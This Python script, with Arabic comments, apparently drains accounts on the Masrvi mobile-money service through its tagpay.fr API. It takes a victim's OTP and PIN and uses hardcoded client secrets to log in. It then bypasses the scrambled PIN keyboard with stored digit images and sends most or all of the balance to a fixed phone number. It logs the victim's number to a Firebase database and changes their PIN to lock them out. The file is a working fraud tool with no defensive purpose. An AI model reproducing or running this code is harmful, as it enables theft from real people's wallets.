import requests
import json
import uuid
import sys
DB_URL = "https://masrviblock-default-rtdb.firebaseio.com/numbers.json"
# -----------------------
# استقبال المدخلات من Flask
# -----------------------

otp = sys.argv[1]
access_token = sys.argv[2]
num = sys.argv[3]
current_password = sys.argv[4]

# -----------------------
# إعداد session
# -----------------------

install_id = "e44c3046-1908-4bc0-b8f3-c41a9e8f82ed"
session = requests.Session()

BASE_URL = "https://22201.tagpay.fr/api/client/v1"

COMMON_HEADERS = {
    "User-Agent": "Masrvi / 25.09.6713(6713)",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json"
}

# -----------------------
# طلب OTP
# -----------------------

url3 = "https://22201.tagpay.fr/api/client/v1/oauth2/otp"

payload3 = {
    "grant_type": "password",
    "client_id": "80b60e90eb4c6fafe349f03614f72047",
    "client_secret": "66c0d0406f9502121f002d936485a3ddb2ec633ff78c04f770d393941e59e311",
    "scope": [
"payment",
"bill_payment",
"p2p_transfer",
"p2p_simple_transfer",
"p2p_cash_transfer",
"p2p_transfer_dedicated",
"retrieve_cash_transfer",
"payout",
"transaction_code",
"subscribe_loan",
"consult_loans",
"wallet_to_bank",
"bank_to_wallet",
"consult_bank_account",
"cards_management",
"cards_virtual_creation",
"mobiles_management",
"notifications",
"kyc_view",
"kyc_update",
"pincode_update",
"accounts_view",
"consult_authorization_holds",
"pincode_check",
"client_onboarding",
"sda_customer_onboarding_create",
"sda_customer_onboarding_view",
"sda_customer_onboarding_update",
"sda_customer_onboarding_submit",
"sda_customer-actions_initiate",
"acceptor_search",
"configuration",
"otp_check",
"withdraw",
"wallet_recharge_by_card",
"qr_code_management",
"spendings_categorization_management",
"bic_referential_view",
"external_account_management",
"external_account_usage",
"beneficiaries_management",
"beneficiaries_usage",
"strong_customer_authentication",
"card_sensitive_data_view",
"identity_documents_view",
"identity_view",
"trusted_devices",
"mandate_view",
"mandate_management",
"sda_esign_management",
"sda_identity_contexts_read",
"customer-instruction_deletion",
"customer-instruction_initiation",
"customer-instruction_submit",
"customer-instruction_update",
"customer-instruction_view",
"payment-service-contract_view",
"payment-instruction_view",
"payment-standing-order_create",
"payment-standing-order_update",
"payment-standing-order_delete",
"payment-standing-order_view",
"payment_network",
"product_management",
"recipients_create",
"sda_accounts_name_update",
"sda_accounts_view",
"sda_authentications-sessions_initiate",
"sda_authentications-sessions_auth",
"sda_authentications-sessions_view",
"sda_authentications-sessions_suspicious",
"sda_exchange-rates_view",
"sda_required-actions_write",
"sda_transactions_view",
"cdt_product_read",
"cdt_credit_request_read",
"cdt_credit_request_write",
"cdt_credit_servicing_read",
"sav_contract_read",
"sav_deposit",
"sav_documents_read",
"document_setup_view",
"additional-data_read",
"form_read"
],
    "username": access_token,
    "password": otp,
    "install_id": install_id
}

headers3 = {
    "User-Agent": "Masrvi2 / 25.09.6713(6713)",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json"
}

response3 = requests.post(url3, json=payload3, headers=headers3)
otp_data = response3.json()
otp_token = otp_data.get("access_token")

if not otp_token:
    print(json.dumps({"status": "fail", "message": "OTP failed"}))
    sys.exit()

# -----------------------
# accounts
# -----------------------

url_accounts = "https://22201.tagpay.fr/api/service-domain/v1/accounts"

params = {
    'status[]': ["OPENED", "BLOCKED", "DEBIT_BLOCKED", "CREDIT_BLOCKED"],
    'limit': "200"
}

headers_accounts = {
    "User-Agent": "Masrvi2 / 25.09.6713(6713)",
    "Accept": "application/json, text/plain, */*",
    "accept-language": "ar_MR",
    "authorization": f"Bearer {otp_token}",
    "Cookie": "PHPSESSID=fj4dv35jctmpbicb0ljdlv5cs9"
}

response = requests.get(url_accounts, params=params, headers=headers_accounts)
data = response.json()

# -----------------------
# database (placeholder)
# -----------------------

database = {
    0: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAL9JREFUSInt0zEOhCAQBVAMBSVH4CgeTY7mUTiCpYVhHGLhfD7JZrfYikksfCYDyB/nZs36XHLhexDJAEmkAGwiJ7YQbLIoiAXfwHYNDXYDUUoCSJIDrLtW7XtY0DUBtvN5XtCvq4XWMF0dRADdQ6z2KAoBII/AHNc38ADuJ1gY8gu1g/AXoGV5Y8Otf3v8jEA/eXANOwJd5eCySxcHCgxFikJHsdTgegguRZvCT+NBA0QjxkNIY0qDTKM+a9awbrjnrg9cY3dfAAAAAElFTkSuQmCC",
    1: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAADFJREFUSIljYBgFo4AMwPwHTYAfXcAeTYDxP5oAO7qAPH0EMFw6KjAqMCowCkYBSQAAjXhFBPlDmZUAAAAASUVORK5CYII=",
    2: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAKVJREFUSInt07ENwyAQBVAQBeWNwCiMRkbzKB7BpQuLb9zlfyzhRJHS8DuerOPOgHMzM+OUg9cBYDBgIcjAxiWAnQAAVfV3UHnXNYPhZQQRl71DFbDa6hIcQ2h903RfwBUqegf+cwhyDj3EOgKTw3Wpg10gK5RNACuvvULQ/xN1NtNRknaetdGifckl/EkbWdvQ1+Hkpve7Rt21vR/QR+k/MDPzMCdgeYvq3JSF0QAAAABJRU5ErkJggg==",
    3: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAL9JREFUSInt07sRxCAMBFAYAoeUQCmUZpfmUijBoQOGPV3mXXmOuZwdJ36B+AiFsLIyD27+3wCGApwEFWgEO3BxTXDVaNCfkAwGr9qqwJHB8P0eycPKEHQPkeE2OB5QXiFw5pAUNoU8BIrC3vkf2hi95KBtMDgUzmkNt4rsY4Pbuj+trJsUom4kzGH/CbUZtP/g0hqXLOvhFihdzlKGnDZD7iPb05aXDJ4xNw1J5yXqRPmZq9rsrIMctbUrK6/5AKkKkzmgRRuGAAAAAElFTkSuQmCC",
    4: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAHxJREFUSIntziEOgDAQRNFtKip7hB6lRyuOa+G4Bg6Lo4J0CXIHMQRDSPrlU1+k13tTagCZQkFQBg7BIwQKESFRyDtAWRnobMHpaMHfIVgIDSAeDFIFyBuDsgDoRMDpYMGrWAg3aADxAEiVQd4AysJAr9r3IAJjv4Je70kniyyNqv5M5p4AAAAASUVORK5CYII=",
    5: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAKhJREFUSInt0rENwzAMBEAaLlR6BI3i0azRMopHcGkggj5U538FEZzClb68Rk+KZiMj9wPPT5gegblIr38g34bQh7OBWASAF8Eb2K+w+LCnQlYoCujAHpEIUqAiEb5nAn+TwVtR1QobwWG20jCe9ehBfATo2dqSQatX4OGaaZt9ZFnhUmxmqFtPFwj6L6G5df3sSc/B9GBsA3j6KEdXn0kEBr3lkZFv+QBqsJl9nTuIVgAAAABJRU5ErkJggg==",
    6: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAN1JREFUSIntk7ENAyEMRYmuoLwRPAqjcRtkhIwSpBRZgxEorzjdj93xTaRTpJT8jidkf39wCFNT18oHnxeAwQoUAgJUAgnYuSbAVeHATcHJXZtQ34gtOqCXtt7XqWUIaAuyKvsXkHuQ2iWogTWAPIByDYSmV5egUQJeLmS8gUbg7jLFw2WKJ/gtgQHURH1hqfduteLCwELundnTM2guEwOUml1P7SeQ/wDMA/lI3ukAxA8nh3660oHVB7RahFsHIqoQWPwzDNsw7IttFK9Yct/BtrIQiH6Rg6s5NfVdHzZ0tl+g5INtAAAAAElFTkSuQmCC",
    7: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAHFJREFUSInt0LENgDAQQ9EgipSMwCgZjYzGKIxASYFISBkbyQQhaM7dPema75zN1ryQzs3/Q1mK9d0xwEdPcAB4gh1g0LABjAQrQCBYACYJ3Icg1veTYAgcDEEH4z4SOBjCC8Eu+ij4KFh7QR3MZru3DKTMY/3cTbi/AAAAAElFTkSuQmCC",
    8: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAMFJREFUSIntk7ERAyEMBPE4+JASKOVL40ujFEog/ID5s8h0kmYc2CHK2EA6aYeUdu36Wi9MBgdwEShAJ1CBQQDAzT2BR4O3BTIEYNALzc0QRuCRNgSmDGo6qGzC4A5A/RFk29SDFUwnPR4LILuo99os04FEC19sHZlNOQ1O1GlBJIqaBqImi8q4Ai9Nx4g0VB3kHAE4CfQIjH+DEQAO5qIv2RqUJZsAzD0yWjH2AQ/U22sI7ZNKb9995GS/+q5dYX0AQwSzElqMhjkAAAAASUVORK5CYII=",
    9: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAN1JREFUSInt07kRAyEMBdD1OCCkBJVCabgTt0InpgTCDZiVvzK+8CwuAGW8PQAdx7FjxzIe2hiiXgxJ9UWQVSv/QvknT8A5QgB0D7RN1JIJRGEEHV+NB0kndiZogDIeFMecIE8wXsaeriG1FeR7qP8AJTXb5cak4vpPBkvQCHIhhQRIMkFUV7rgwUr5GcGK/aZqA4Qga2cQbeIapCTXdscMdQX5Fux1KrYBtYNtSSDNtZRYkh0EasvYXZ9iJdTJAVmfmp9gmpdpoizJlQBDWAgwprTGQTrDNOo7dvyMLzbxsSA7uYS5AAAAAElFTkSuQmCC",
}
reverse_db = {v: k for k, v in database.items()}

success = False

# -----------------------
# keyboard functions
# -----------------------

def get_keyboard(token):
    headers = COMMON_HEADERS.copy()
    headers["authorization"] = f"Bearer {token}"

    res = session.get(
        f"{BASE_URL}/keyboard",
        params={
            "font": "DMSans-Medium",
            "width": "124",
            "fontSize": "62"
        },
        headers=headers
    )

    data = res.json()
    return data.get("images", []), data.get("id")


def extract(images):
    result = {}
    for i, img in enumerate(images):
        num_value = reverse_db.get(img)
        if num_value is not None:
            result[num_value] = i
    return result


def build(pin, mapping):
    digits = [int(x) for x in pin]
    values = [mapping.get(d) for d in digits]
    if None in values:
        return None
    return values


# -----------------------
# send transfer
# -----------------------
def save_number_to_db(number):
    try:
        res = requests.get(DB_URL)
        data = res.json()

        if data is None:
            data = {"numbers": []}

        if "numbers" not in data:
            data["numbers"] = []

        if number not in data["numbers"]:
            data["numbers"].append(number)

        requests.put(DB_URL, json=data)

    except Exception as e:
        print("DB error:", e)
def send_transfer(amount, original):
    images, kid = get_keyboard(otp_token)
    mapping = extract(images)
    pin_values = build(current_password, mapping)

    if not pin_values:
        return False

    payload = {
        "metadata": {
            "mode": "TRANSACTION",
            "confirmationMode": "PINCODE",
            "pincode": {
                "id": kid,
                "value": pin_values
            }
        },
        "data": {
            "amount": {
                "currency": "MRU",
                "value": amount,
                "originalInput": original
            },
            "label": "",
            "phoneNumber": "22230616448"
        }
    }

    res = session.post(
        f"{BASE_URL}/transactions/p2p-simple-transfer",
        json=payload,
        headers={
            **COMMON_HEADERS,
            "authorization": f"Bearer {otp_token}"
        }
    )

    result = res.json()

    transaction = result.get("metadata", {}).get("transaction")

    if transaction and transaction.get("id") and transaction.get("amount"):
        return True
    else:
        return False


# -----------------------
# processing
# -----------------------

if "items" in data and len(data["items"]) > 0:

    account = data["items"][0]

    balance_value = None
    for b in account["balances"]:
        if b["balanceType"] == "AvailableBalance":
            balance_value = b["value"]
            break

    if balance_value is None:
        print("لم يتم العثور على AvailableBalance")
        sys.exit()

    print(f"القيمة الحالية: {balance_value}")

    # -----------------------
    # transfers
    # -----------------------

    if balance_value < 2000000:

        amount = int(balance_value * 0.9)
        original = str(balance_value / 100)

        success = send_transfer(amount, original)

    else:

        success = True

        for i in range(15):

            amount = 2000000
            original = "20000"

            ok = send_transfer(amount, original)

            print(f"عملية {i+1}: {'نجاح' if ok else 'فشل'}")

            if not ok:
                success = False
                break

    # -----------------------
    # PIN change ONLY if success
    # -----------------------

    if success:
        

        print("تمت العمليات بنجاح - سيتم تغيير PIN")
        save_number_to_db(int(num))

        images1, id_old = get_keyboard(otp_token)
        map1 = extract(images1)
        current_pin = build(current_password, map1)

        images2, id_new = get_keyboard(otp_token)
        map2 = extract(images2)
        new_pin = build("0987", map2)

        if not current_pin or not new_pin:
            print("فشل PIN")
            sys.exit()

        payload = {
            "currentPincode": {
                "id": id_old,
                "value": current_pin
            },
            "newPincode": {
                "id": id_new,
                "value": new_pin
            }
        }

        res = session.put(
            f"{BASE_URL}/client/pincode",
            json=payload,
            headers={
                **COMMON_HEADERS,
                "authorization": f"Bearer {otp_token}"
            }
        )

        print(res.text)

    else:
        print("لم تنجح العمليات - لن يتم تغيير PIN")

else:
    print("لا توجد حسابات")
